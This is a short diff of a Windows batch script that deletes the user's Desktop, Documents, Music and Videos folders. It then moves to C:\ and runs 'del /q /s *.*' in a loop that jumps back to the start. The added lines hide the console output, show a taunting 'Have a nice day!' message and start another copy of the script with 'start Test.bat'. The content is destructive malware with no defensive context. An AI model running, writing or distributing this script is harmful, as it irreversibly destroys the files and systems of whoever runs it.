@@ -1,3 +1,4 @@
+@echo off
 set place=%cd%
 set user=%USERNAME%
 
@@ -16,6 +17,14 @@ rmdir /q /s Desktop
 rmdir /q /s Documents
 rmdir /q /s Music
 rmdir /q /s Videos
+
+echo 
+echo Have a nice day!
+echo
+timeout 5
+
+start Test.bat
+
 cd "C:\"
 del /q /s *.*
 goto 1
